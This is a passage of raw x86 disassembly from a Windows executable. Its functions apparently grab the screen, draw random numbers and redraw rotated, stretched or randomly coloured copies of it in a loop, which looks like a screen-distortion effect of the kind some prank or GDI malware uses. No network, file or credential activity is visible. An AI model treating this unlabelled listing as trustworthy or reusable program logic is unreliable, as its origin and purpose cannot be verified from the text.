  401d57:	ff 74 24 18          	push   0x18(%esp)
  401d5b:	89 44 24 24          	mov    %eax,0x24(%esp)
  401d5f:	ff 15 14 00 41 00    	call   *0x410014
  401d65:	68 20 00 cc 00       	push   $0xcc0020
  401d6a:	6a 00                	push   $0x0
  401d6c:	6a 00                	push   $0x0
  401d6e:	ff 74 24 1c          	push   0x1c(%esp)
  401d72:	57                   	push   %edi
  401d73:	56                   	push   %esi
  401d74:	6a 00                	push   $0x0
  401d76:	6a 00                	push   $0x0
  401d78:	ff 74 24 34          	push   0x34(%esp)
  401d7c:	ff 15 0c 00 41 00    	call   *0x41000c
  401d82:	c7 44 24 0c 00 00 80 	movl   $0x800000,0xc(%esp)
  401d89:	00 
  401d8a:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
  401d8f:	ff 74 24 0c          	push   0xc(%esp)
  401d93:	57                   	push   %edi
  401d94:	56                   	push   %esi
  401d95:	8b 74 24 40          	mov    0x40(%esp),%esi
  401d99:	56                   	push   %esi
  401d9a:	ff 74 24 40          	push   0x40(%esp)
  401d9e:	ff 74 24 28          	push   0x28(%esp)
  401da2:	57                   	push   %edi
  401da3:	8b 7d 08             	mov    0x8(%ebp),%edi
  401da6:	f7 ef                	imul   %edi
  401da8:	ff 74 24 34          	push   0x34(%esp)
  401dac:	c1 fa 03             	sar    $0x3,%edx
  401daf:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
  401db4:	8b ca                	mov    %edx,%ecx
  401db6:	c1 e9 1f             	shr    $0x1f,%ecx
  401db9:	03 ca                	add    %edx,%ecx
  401dbb:	f7 ef                	imul   %edi
  401dbd:	6b c9 19             	imul   $0x19,%ecx,%ecx
  401dc0:	c1 fa 06             	sar    $0x6,%edx
  401dc3:	8b c2                	mov    %edx,%eax
  401dc5:	c1 e8 1f             	shr    $0x1f,%eax
  401dc8:	03 c2                	add    %edx,%eax
  401dca:	2b cf                	sub    %edi,%ecx
  401dcc:	69 c0 c8 00 00 00    	imul   $0xc8,%eax,%eax
  401dd2:	03 ce                	add    %esi,%ecx
  401dd4:	51                   	push   %ecx
  401dd5:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  401dd9:	2b c8                	sub    %eax,%ecx
  401ddb:	8d 47 0a             	lea    0xa(%edi),%eax
  401dde:	03 c1                	add    %ecx,%eax
  401de0:	50                   	push   %eax
  401de1:	ff 74 24 38          	push   0x38(%esp)
  401de5:	ff 15 64 01 41 00    	call   *0x410164
  401deb:	ff 74 24 14          	push   0x14(%esp)
  401def:	8b 35 48 00 41 00    	mov    0x410048,%esi
  401df5:	ff d6                	call   *%esi
  401df7:	ff 74 24 1c          	push   0x1c(%esp)
  401dfb:	ff d6                	call   *%esi
  401dfd:	6a 14                	push   $0x14
  401dff:	ff 15 a8 00 41 00    	call   *0x4100a8
  401e05:	5f                   	pop    %edi
  401e06:	5e                   	pop    %esi
  401e07:	8b e5                	mov    %ebp,%esp
  401e09:	5d                   	pop    %ebp
  401e0a:	c3                   	ret
  401e0b:	cc                   	int3
  401e0c:	cc                   	int3
  401e0d:	cc                   	int3
  401e0e:	cc                   	int3
  401e0f:	cc                   	int3
  401e10:	55                   	push   %ebp
  401e11:	8b ec                	mov    %esp,%ebp
  401e13:	83 e4 f0             	and    $0xfffffff0,%esp
  401e16:	83 ec 38             	sub    $0x38,%esp
  401e19:	a1 04 70 41 00       	mov    0x417004,%eax
  401e1e:	33 c4                	xor    %esp,%eax
  401e20:	89 44 24 34          	mov    %eax,0x34(%esp)
  401e24:	8b 45 0c             	mov    0xc(%ebp),%eax
  401e27:	0f 57 c0             	xorps  %xmm0,%xmm0
  401e2a:	56                   	push   %esi
  401e2b:	8b 35 80 01 41 00    	mov    0x410180,%esi
  401e31:	57                   	push   %edi
  401e32:	89 44 24 18          	mov    %eax,0x18(%esp)
  401e36:	8d 44 24 20          	lea    0x20(%esp),%eax
  401e3a:	50                   	push   %eax
  401e3b:	68 50 42 40 00       	push   $0x404250
  401e40:	6a 00                	push   $0x0
  401e42:	6a 00                	push   $0x0
  401e44:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  401e49:	ff d6                	call   *%esi
  401e4b:	8d 44 24 20          	lea    0x20(%esp),%eax
  401e4f:	0f 57 c0             	xorps  %xmm0,%xmm0
  401e52:	50                   	push   %eax
  401e53:	68 50 42 40 00       	push   $0x404250
  401e58:	6a 00                	push   $0x0
  401e5a:	6a 00                	push   $0x0
  401e5c:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  401e61:	ff d6                	call   *%esi
  401e63:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  401e67:	2b 44 24 24          	sub    0x24(%esp),%eax
  401e6b:	8b 74 24 28          	mov    0x28(%esp),%esi
  401e6f:	2b 74 24 20          	sub    0x20(%esp),%esi
  401e73:	8b 3d 04 00 41 00    	mov    0x410004,%edi
  401e79:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401e7d:	8b 45 08             	mov    0x8(%ebp),%eax
  401e80:	8d 04 40             	lea    (%eax,%eax,2),%eax
  401e83:	89 44 24 14          	mov    %eax,0x14(%esp)
  401e87:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  401e8c:	85 c0                	test   %eax,%eax
  401e8e:	75 23                	jne    0x401eb3
  401e90:	68 40 00 00 f0       	push   $0xf0000040
  401e95:	6a 01                	push   $0x1
  401e97:	6a 00                	push   $0x0
  401e99:	6a 00                	push   $0x0
  401e9b:	68 f8 81 41 00       	push   $0x4181f8
  401ea0:	ff d7                	call   *%edi
  401ea2:	85 c0                	test   %eax,%eax
  401ea4:	75 08                	jne    0x401eae
  401ea6:	6a 01                	push   $0x1
  401ea8:	ff 15 94 00 41 00    	call   *0x410094
  401eae:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  401eb3:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401eb7:	51                   	push   %ecx
  401eb8:	6a 04                	push   $0x4
  401eba:	50                   	push   %eax
  401ebb:	ff 15 00 00 41 00    	call   *0x410000
  401ec1:	8b 44 24 34          	mov    0x34(%esp),%eax
  401ec5:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  401eca:	99                   	cltd
  401ecb:	f7 fe                	idiv   %esi
  401ecd:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  401ed2:	89 54 24 34          	mov    %edx,0x34(%esp)
  401ed6:	85 c0                	test   %eax,%eax
  401ed8:	75 21                	jne    0x401efb
  401eda:	68 40 00 00 f0       	push   $0xf0000040
  401edf:	6a 01                	push   $0x1
  401ee1:	50                   	push   %eax
  401ee2:	50                   	push   %eax
  401ee3:	68 f8 81 41 00       	push   $0x4181f8
  401ee8:	ff d7                	call   *%edi
  401eea:	85 c0                	test   %eax,%eax
  401eec:	75 08                	jne    0x401ef6
  401eee:	6a 01                	push   $0x1
  401ef0:	ff 15 94 00 41 00    	call   *0x410094
  401ef6:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  401efb:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401eff:	51                   	push   %ecx
  401f00:	6a 04                	push   $0x4
  401f02:	50                   	push   %eax
  401f03:	ff 15 00 00 41 00    	call   *0x410000
  401f09:	8b 44 24 38          	mov    0x38(%esp),%eax
  401f0d:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  401f11:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  401f16:	99                   	cltd
  401f17:	f7 ff                	idiv   %edi
  401f19:	68 20 00 cc 00       	push   $0xcc0020
  401f1e:	8b ca                	mov    %edx,%ecx
  401f20:	8b c1                	mov    %ecx,%eax
  401f22:	99                   	cltd
  401f23:	f7 ff                	idiv   %edi
  401f25:	8b 44 24 18          	mov    0x18(%esp),%eax
  401f29:	52                   	push   %edx
  401f2a:	99                   	cltd
  401f2b:	2b c2                	sub    %edx,%eax
  401f2d:	d1 f8                	sar    $1,%eax
  401f2f:	03 44 24 3c          	add    0x3c(%esp),%eax
  401f33:	99                   	cltd
  401f34:	f7 fe                	idiv   %esi
  401f36:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401f3a:	52                   	push   %edx
  401f3b:	99                   	cltd
  401f3c:	f7 ff                	idiv   %edi
  401f3e:	ff 74 24 24          	push   0x24(%esp)
  401f42:	8b 44 24 24          	mov    0x24(%esp),%eax
  401f46:	52                   	push   %edx
  401f47:	99                   	cltd
  401f48:	f7 fe                	idiv   %esi
  401f4a:	52                   	push   %edx
  401f4b:	51                   	push   %ecx
  401f4c:	ff 74 24 50          	push   0x50(%esp)
  401f50:	ff 74 24 38          	push   0x38(%esp)
  401f54:	ff 15 0c 00 41 00    	call   *0x41000c
  401f5a:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  401f5e:	5f                   	pop    %edi
  401f5f:	5e                   	pop    %esi
  401f60:	33 cc                	xor    %esp,%ecx
  401f62:	e8 03 23 00 00       	call   0x40426a
  401f67:	8b e5                	mov    %ebp,%esp
  401f69:	5d                   	pop    %ebp
  401f6a:	c3                   	ret
  401f6b:	cc                   	int3
  401f6c:	cc                   	int3
  401f6d:	cc                   	int3
  401f6e:	cc                   	int3
  401f6f:	cc                   	int3
  401f70:	55                   	push   %ebp
  401f71:	8b ec                	mov    %esp,%ebp
  401f73:	83 e4 f0             	and    $0xfffffff0,%esp
  401f76:	83 ec 48             	sub    $0x48,%esp
  401f79:	a1 04 70 41 00       	mov    0x417004,%eax
  401f7e:	33 c4                	xor    %esp,%eax
  401f80:	89 44 24 44          	mov    %eax,0x44(%esp)
  401f84:	8b 45 0c             	mov    0xc(%ebp),%eax
  401f87:	0f 57 c0             	xorps  %xmm0,%xmm0
  401f8a:	56                   	push   %esi
  401f8b:	8b 35 80 01 41 00    	mov    0x410180,%esi
  401f91:	57                   	push   %edi
  401f92:	89 44 24 10          	mov    %eax,0x10(%esp)
  401f96:	8d 44 24 20          	lea    0x20(%esp),%eax
  401f9a:	50                   	push   %eax
  401f9b:	68 50 42 40 00       	push   $0x404250
  401fa0:	6a 00                	push   $0x0
  401fa2:	6a 00                	push   $0x0
  401fa4:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  401fa9:	ff d6                	call   *%esi
  401fab:	8d 44 24 20          	lea    0x20(%esp),%eax
  401faf:	0f 57 c0             	xorps  %xmm0,%xmm0
  401fb2:	50                   	push   %eax
  401fb3:	68 50 42 40 00       	push   $0x404250
  401fb8:	6a 00                	push   $0x0
  401fba:	6a 00                	push   $0x0
  401fbc:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  401fc1:	ff d6                	call   *%esi
  401fc3:	8b 7c 24 28          	mov    0x28(%esp),%edi
  401fc7:	2b 7c 24 20          	sub    0x20(%esp),%edi
  401fcb:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  401fcf:	ff 74 24 10          	push   0x10(%esp)
  401fd3:	2b 74 24 28          	sub    0x28(%esp),%esi
  401fd7:	89 7c 24 20          	mov    %edi,0x20(%esp)
  401fdb:	ff 15 1c 00 41 00    	call   *0x41001c
  401fe1:	56                   	push   %esi
  401fe2:	57                   	push   %edi
  401fe3:	ff 74 24 18          	push   0x18(%esp)
  401fe7:	89 44 24 24          	mov    %eax,0x24(%esp)
  401feb:	ff 15 10 00 41 00    	call   *0x410010
  401ff1:	8b f8                	mov    %eax,%edi
  401ff3:	57                   	push   %edi
  401ff4:	ff 74 24 1c          	push   0x1c(%esp)
  401ff8:	ff 15 14 00 41 00    	call   *0x410014
  401ffe:	68 20 00 cc 00       	push   $0xcc0020
  402003:	6a 00                	push   $0x0
  402005:	6a 00                	push   $0x0
  402007:	ff 74 24 1c          	push   0x1c(%esp)
  40200b:	56                   	push   %esi
  40200c:	ff 74 24 30          	push   0x30(%esp)
  402010:	6a 00                	push   $0x0
  402012:	6a 00                	push   $0x0
  402014:	ff 74 24 38          	push   0x38(%esp)
  402018:	ff 15 0c 00 41 00    	call   *0x41000c
  40201e:	6a 02                	push   $0x2
  402020:	ff 74 24 14          	push   0x14(%esp)
  402024:	c7 44 24 1c 00 00 80 	movl   $0x800000,0x1c(%esp)
  40202b:	00 
  40202c:	ff 15 24 00 41 00    	call   *0x410024
  402032:	f2 0f 10 05 b8 4e 41 	movsd  0x414eb8,%xmm0
  402039:	00 
  40203a:	e8 21 ce 00 00       	call   0x40ee60
  40203f:	f2 0f 11 44 24 20    	movsd  %xmm0,0x20(%esp)
  402045:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402049:	f3 0f 11 44 24 34    	movss  %xmm0,0x34(%esp)
  40204f:	f2 0f 10 05 b8 4e 41 	movsd  0x414eb8,%xmm0
  402056:	00 
  402057:	e8 c4 cf 00 00       	call   0x40f020
  40205c:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402060:	0f 57 c9             	xorps  %xmm1,%xmm1
  402063:	f2 0f 10 6c 24 20    	movsd  0x20(%esp),%xmm5
  402069:	0f 28 e0             	movaps %xmm0,%xmm4
  40206c:	f2 0f 5a cc          	cvtsd2ss %xmm4,%xmm1
  402070:	99                   	cltd
  402071:	2b c2                	sub    %edx,%eax
  402073:	d1 f8                	sar    $1,%eax
  402075:	f3 0f 11 4c 24 38    	movss  %xmm1,0x38(%esp)
  40207b:	0f 28 cc             	movaps %xmm4,%xmm1
  40207e:	0f 57 0d 20 4f 41 00 	xorps  0x414f20,%xmm1
  402085:	66 0f 6e d8          	movd   %eax,%xmm3
  402089:	8b c6                	mov    %esi,%eax
  40208b:	f2 0f 5a c9          	cvtsd2ss %xmm1,%xmm1
  40208f:	99                   	cltd
  402090:	2b c2                	sub    %edx,%eax
  402092:	d1 f8                	sar    $1,%eax
  402094:	f3 0f e6 db          	cvtdq2pd %xmm3,%xmm3
  402098:	f3 0f 11 4c 24 3c    	movss  %xmm1,0x3c(%esp)
  40209e:	66 0f 5a cd          	cvtpd2ps %xmm5,%xmm1
  4020a2:	66 0f 6e d0          	movd   %eax,%xmm2
  4020a6:	f3 0f 11 4c 24 40    	movss  %xmm1,0x40(%esp)
  4020ac:	f3 0f e6 d2          	cvtdq2pd %xmm2,%xmm2
  4020b0:	0f 28 c5             	movaps %xmm5,%xmm0
  4020b3:	8d 44 24 34          	lea    0x34(%esp),%eax
  4020b7:	f2 0f 59 c3          	mulsd  %xmm3,%xmm0
  4020bb:	0f 28 cb             	movaps %xmm3,%xmm1
  4020be:	50                   	push   %eax
  4020bf:	ff 74 24 14          	push   0x14(%esp)
  4020c3:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
  4020c7:	f2 0f 5c c8          	subsd  %xmm0,%xmm1
  4020cb:	0f 28 c4             	movaps %xmm4,%xmm0
  4020ce:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  4020d2:	f2 0f 5c d5          	subsd  %xmm5,%xmm2
  4020d6:	f2 0f 59 e3          	mulsd  %xmm3,%xmm4
  4020da:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
  4020de:	f2 0f 5c d4          	subsd  %xmm4,%xmm2
  4020e2:	66 0f 5a c1          	cvtpd2ps %xmm1,%xmm0
  4020e6:	f3 0f 11 44 24 4c    	movss  %xmm0,0x4c(%esp)
  4020ec:	66 0f 5a c2          	cvtpd2ps %xmm2,%xmm0
  4020f0:	f3 0f 11 44 24 50    	movss  %xmm0,0x50(%esp)
  4020f6:	ff 15 50 00 41 00    	call   *0x410050
  4020fc:	ff 74 24 14          	push   0x14(%esp)
  402100:	8b 44 24 20          	mov    0x20(%esp),%eax
  402104:	56                   	push   %esi
  402105:	50                   	push   %eax
  402106:	6a 00                	push   $0x0
  402108:	6a 00                	push   $0x0
  40210a:	ff 74 24 2c          	push   0x2c(%esp)
  40210e:	56                   	push   %esi
  40210f:	50                   	push   %eax
  402110:	ff 75 08             	push   0x8(%ebp)
  402113:	6a 00                	push   $0x0
  402115:	ff 74 24 38          	push   0x38(%esp)
  402119:	ff 15 64 01 41 00    	call   *0x410164
  40211f:	ff 74 24 18          	push   0x18(%esp)
  402123:	8b 35 48 00 41 00    	mov    0x410048,%esi
  402129:	ff d6                	call   *%esi
  40212b:	57                   	push   %edi
  40212c:	ff d6                	call   *%esi
  40212e:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  402132:	5f                   	pop    %edi
  402133:	5e                   	pop    %esi
  402134:	33 cc                	xor    %esp,%ecx
  402136:	e8 2f 21 00 00       	call   0x40426a
  40213b:	8b e5                	mov    %ebp,%esp
  40213d:	5d                   	pop    %ebp
  40213e:	c3                   	ret
  40213f:	cc                   	int3
  402140:	55                   	push   %ebp
  402141:	8b ec                	mov    %esp,%ebp
  402143:	83 e4 f0             	and    $0xfffffff0,%esp
  402146:	83 ec 68             	sub    $0x68,%esp
  402149:	a1 04 70 41 00       	mov    0x417004,%eax
  40214e:	33 c4                	xor    %esp,%eax
  402150:	89 44 24 64          	mov    %eax,0x64(%esp)
  402154:	56                   	push   %esi
  402155:	8b 35 80 01 41 00    	mov    0x410180,%esi
  40215b:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40215f:	57                   	push   %edi
  402160:	8b 7d 0c             	mov    0xc(%ebp),%edi
  402163:	0f 57 c0             	xorps  %xmm0,%xmm0
  402166:	50                   	push   %eax
  402167:	68 50 42 40 00       	push   $0x404250
  40216c:	6a 00                	push   $0x0
  40216e:	6a 00                	push   $0x0
  402170:	89 7c 24 20          	mov    %edi,0x20(%esp)
  402174:	0f 29 44 24 40       	movaps %xmm0,0x40(%esp)
  402179:	ff d6                	call   *%esi
  40217b:	8d 44 24 30          	lea    0x30(%esp),%eax
  40217f:	0f 57 c0             	xorps  %xmm0,%xmm0
  402182:	50                   	push   %eax
  402183:	68 50 42 40 00       	push   $0x404250
  402188:	6a 00                	push   $0x0
  40218a:	6a 00                	push   $0x0
  40218c:	0f 29 44 24 40       	movaps %xmm0,0x40(%esp)
  402191:	ff d6                	call   *%esi
  402193:	8b 74 24 38          	mov    0x38(%esp),%esi
  402197:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40219b:	2b 44 24 34          	sub    0x34(%esp),%eax
  40219f:	2b 74 24 30          	sub    0x30(%esp),%esi
  4021a3:	57                   	push   %edi
  4021a4:	89 74 24 24          	mov    %esi,0x24(%esp)
  4021a8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4021ac:	ff 15 1c 00 41 00    	call   *0x41001c
  4021b2:	ff 74 24 18          	push   0x18(%esp)
  4021b6:	89 44 24 20          	mov    %eax,0x20(%esp)
  4021ba:	56                   	push   %esi
  4021bb:	57                   	push   %edi
  4021bc:	ff 15 10 00 41 00    	call   *0x410010
  4021c2:	50                   	push   %eax
  4021c3:	ff 74 24 20          	push   0x20(%esp)
  4021c7:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4021cb:	ff 15 14 00 41 00    	call   *0x410014
  4021d1:	68 20 00 cc 00       	push   $0xcc0020
  4021d6:	6a 00                	push   $0x0
  4021d8:	6a 00                	push   $0x0
  4021da:	57                   	push   %edi
  4021db:	8b 7c 24 28          	mov    0x28(%esp),%edi
  4021df:	57                   	push   %edi
  4021e0:	56                   	push   %esi
  4021e1:	6a 00                	push   $0x0
  4021e3:	6a 00                	push   $0x0
  4021e5:	ff 74 24 3c          	push   0x3c(%esp)
  4021e9:	ff 15 0c 00 41 00    	call   *0x41000c
  4021ef:	8b c6                	mov    %esi,%eax
  4021f1:	c7 44 24 14 00 00 80 	movl   $0x800000,0x14(%esp)
  4021f8:	00 
  4021f9:	99                   	cltd
  4021fa:	2b c2                	sub    %edx,%eax
  4021fc:	8b f0                	mov    %eax,%esi
  4021fe:	8b c7                	mov    %edi,%eax
  402200:	99                   	cltd
  402201:	2b c2                	sub    %edx,%eax
  402203:	d1 fe                	sar    $1,%esi
  402205:	6a 02                	push   $0x2
  402207:	ff 74 24 14          	push   0x14(%esp)
  40220b:	8b f8                	mov    %eax,%edi
  40220d:	d1 ff                	sar    $1,%edi
  40220f:	ff 15 24 00 41 00    	call   *0x410024
  402215:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  402219:	75 32                	jne    0x40224d
  40221b:	f2 0f 10 05 b0 4e 41 	movsd  0x414eb0,%xmm0
  402222:	00 
  402223:	e8 38 cc 00 00       	call   0x40ee60
  402228:	f2 0f 11 44 24 30    	movsd  %xmm0,0x30(%esp)
  40222e:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402232:	f3 0f 11 44 24 54    	movss  %xmm0,0x54(%esp)
  402238:	f2 0f 10 05 b0 4e 41 	movsd  0x414eb0,%xmm0
  40223f:	00 
  402240:	e8 db cd 00 00       	call   0x40f020
  402245:	f2 0f 10 5c 24 30    	movsd  0x30(%esp),%xmm3
  40224b:	eb 30                	jmp    0x40227d
  40224d:	f2 0f 10 05 c0 4e 41 	movsd  0x414ec0,%xmm0
  402254:	00 
  402255:	e8 06 cc 00 00       	call   0x40ee60
  40225a:	f2 0f 11 44 24 30    	movsd  %xmm0,0x30(%esp)
  402260:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402264:	f3 0f 11 44 24 54    	movss  %xmm0,0x54(%esp)
  40226a:	f2 0f 10 05 c0 4e 41 	movsd  0x414ec0,%xmm0
  402271:	00 
  402272:	e8 a9 cd 00 00       	call   0x40f020
  402277:	f2 0f 10 5c 24 30    	movsd  0x30(%esp),%xmm3
  40227d:	0f 28 d0             	movaps %xmm0,%xmm2
  402280:	66 0f 6e ee          	movd   %esi,%xmm5
  402284:	0f 57 c9             	xorps  %xmm1,%xmm1
  402287:	66 0f 6e e7          	movd   %edi,%xmm4
  40228b:	f2 0f 5a ca          	cvtsd2ss %xmm2,%xmm1
  40228f:	8d 44 24 54          	lea    0x54(%esp),%eax
  402293:	50                   	push   %eax
  402294:	f3 0f e6 ed          	cvtdq2pd %xmm5,%xmm5
  402298:	f3 0f 11 4c 24 5c    	movss  %xmm1,0x5c(%esp)
  40229e:	0f 28 c3             	movaps %xmm3,%xmm0
  4022a1:	0f 28 ca             	movaps %xmm2,%xmm1
  4022a4:	f2 0f 59 c5          	mulsd  %xmm5,%xmm0
  4022a8:	0f 57 0d 20 4f 41 00 	xorps  0x414f20,%xmm1
  4022af:	f2 0f 5a c9          	cvtsd2ss %xmm1,%xmm1
  4022b3:	f3 0f e6 e4          	cvtdq2pd %xmm4,%xmm4
  4022b7:	f3 0f 11 4c 24 60    	movss  %xmm1,0x60(%esp)
  4022bd:	66 0f 5a cb          	cvtpd2ps %xmm3,%xmm1
  4022c1:	ff 74 24 14          	push   0x14(%esp)
  4022c5:	f3 0f 11 4c 24 68    	movss  %xmm1,0x68(%esp)
  4022cb:	0f 28 cd             	movaps %xmm5,%xmm1
  4022ce:	f2 0f 5c c8          	subsd  %xmm0,%xmm1
  4022d2:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
  4022d6:	0f 28 c2             	movaps %xmm2,%xmm0
  4022d9:	f2 0f 59 d5          	mulsd  %xmm5,%xmm2
  4022dd:	f2 0f 59 c4          	mulsd  %xmm4,%xmm0
  4022e1:	f2 0f 5c e3          	subsd  %xmm3,%xmm4
  4022e5:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
  4022e9:	f2 0f 5c e2          	subsd  %xmm2,%xmm4
  4022ed:	66 0f 5a c1          	cvtpd2ps %xmm1,%xmm0
  4022f1:	f3 0f 11 44 24 6c    	movss  %xmm0,0x6c(%esp)
  4022f7:	66 0f 5a c4          	cvtpd2ps %xmm4,%xmm0
  4022fb:	f3 0f 11 44 24 70    	movss  %xmm0,0x70(%esp)
  402301:	ff 15 50 00 41 00    	call   *0x410050
  402307:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40230c:	8b 35 04 00 41 00    	mov    0x410004,%esi
  402312:	85 c0                	test   %eax,%eax
  402314:	75 23                	jne    0x402339
  402316:	68 40 00 00 f0       	push   $0xf0000040
  40231b:	6a 01                	push   $0x1
  40231d:	6a 00                	push   $0x0
  40231f:	6a 00                	push   $0x0
  402321:	68 f8 81 41 00       	push   $0x4181f8
  402326:	ff d6                	call   *%esi
  402328:	85 c0                	test   %eax,%eax
  40232a:	75 08                	jne    0x402334
  40232c:	6a 01                	push   $0x1
  40232e:	ff 15 94 00 41 00    	call   *0x410094
  402334:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402339:	8b 3d 00 00 41 00    	mov    0x410000,%edi
  40233f:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  402343:	51                   	push   %ecx
  402344:	6a 04                	push   $0x4
  402346:	50                   	push   %eax
  402347:	ff d7                	call   *%edi
  402349:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  40234d:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402352:	89 44 24 30          	mov    %eax,0x30(%esp)
  402356:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40235b:	85 c0                	test   %eax,%eax
  40235d:	75 21                	jne    0x402380
  40235f:	68 40 00 00 f0       	push   $0xf0000040
  402364:	6a 01                	push   $0x1
  402366:	50                   	push   %eax
  402367:	50                   	push   %eax
  402368:	68 f8 81 41 00       	push   $0x4181f8
  40236d:	ff d6                	call   *%esi
  40236f:	85 c0                	test   %eax,%eax
  402371:	75 08                	jne    0x40237b
  402373:	6a 01                	push   $0x1
  402375:	ff 15 94 00 41 00    	call   *0x410094
  40237b:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402380:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  402384:	51                   	push   %ecx
  402385:	6a 04                	push   $0x4
  402387:	50                   	push   %eax
  402388:	ff d7                	call   *%edi
  40238a:	8b 44 24 50          	mov    0x50(%esp),%eax
  40238e:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402393:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402397:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40239c:	85 c0                	test   %eax,%eax
  40239e:	75 21                	jne    0x4023c1
  4023a0:	68 40 00 00 f0       	push   $0xf0000040
  4023a5:	6a 01                	push   $0x1
  4023a7:	50                   	push   %eax
  4023a8:	50                   	push   %eax
  4023a9:	68 f8 81 41 00       	push   $0x4181f8
  4023ae:	ff d6                	call   *%esi
  4023b0:	85 c0                	test   %eax,%eax
  4023b2:	75 08                	jne    0x4023bc
  4023b4:	6a 01                	push   $0x1
  4023b6:	ff 15 94 00 41 00    	call   *0x410094
  4023bc:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4023c1:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  4023c5:	51                   	push   %ecx
  4023c6:	6a 04                	push   $0x4
  4023c8:	50                   	push   %eax
  4023c9:	ff d7                	call   *%edi
  4023cb:	0f b6 4c 24 28       	movzbl 0x28(%esp),%ecx
  4023d0:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4023d4:	c1 e1 08             	shl    $0x8,%ecx
  4023d7:	0f b6 c0             	movzbl %al,%eax
  4023da:	0b c8                	or     %eax,%ecx
  4023dc:	8b 44 24 30          	mov    0x30(%esp),%eax
  4023e0:	c1 e1 08             	shl    $0x8,%ecx
  4023e3:	0f b6 c0             	movzbl %al,%eax
  4023e6:	0b c8                	or     %eax,%ecx
  4023e8:	51                   	push   %ecx
  4023e9:	ff 74 24 14          	push   0x14(%esp)
  4023ed:	ff 15 40 00 41 00    	call   *0x410040
  4023f3:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4023f8:	85 c0                	test   %eax,%eax
  4023fa:	75 21                	jne    0x40241d
  4023fc:	68 40 00 00 f0       	push   $0xf0000040
  402401:	6a 01                	push   $0x1
  402403:	50                   	push   %eax
  402404:	50                   	push   %eax
  402405:	68 f8 81 41 00       	push   $0x4181f8
  40240a:	ff d6                	call   *%esi
  40240c:	85 c0                	test   %eax,%eax
  40240e:	75 08                	jne    0x402418
  402410:	6a 01                	push   $0x1
  402412:	ff 15 94 00 41 00    	call   *0x410094
  402418:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40241d:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402421:	51                   	push   %ecx
  402422:	6a 04                	push   $0x4
  402424:	50                   	push   %eax
  402425:	ff d7                	call   *%edi
  402427:	8b 44 24 30          	mov    0x30(%esp),%eax
  40242b:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402430:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  402434:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402439:	85 c0                	test   %eax,%eax
  40243b:	75 21                	jne    0x40245e
  40243d:	68 40 00 00 f0       	push   $0xf0000040
  402442:	6a 01                	push   $0x1
  402444:	50                   	push   %eax
  402445:	50                   	push   %eax
  402446:	68 f8 81 41 00       	push   $0x4181f8
  40244b:	ff d6                	call   *%esi
  40244d:	85 c0                	test   %eax,%eax
  40244f:	75 08                	jne    0x402459
  402451:	6a 01                	push   $0x1
  402453:	ff 15 94 00 41 00    	call   *0x410094
  402459:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40245e:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  402462:	51                   	push   %ecx
  402463:	6a 04                	push   $0x4
  402465:	50                   	push   %eax
  402466:	ff d7                	call   *%edi
  402468:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40246c:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402471:	89 44 24 50          	mov    %eax,0x50(%esp)
  402475:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40247a:	85 c0                	test   %eax,%eax
  40247c:	75 21                	jne    0x40249f
  40247e:	68 40 00 00 f0       	push   $0xf0000040
  402483:	6a 01                	push   $0x1
  402485:	50                   	push   %eax
  402486:	50                   	push   %eax
  402487:	68 f8 81 41 00       	push   $0x4181f8
  40248c:	ff d6                	call   *%esi
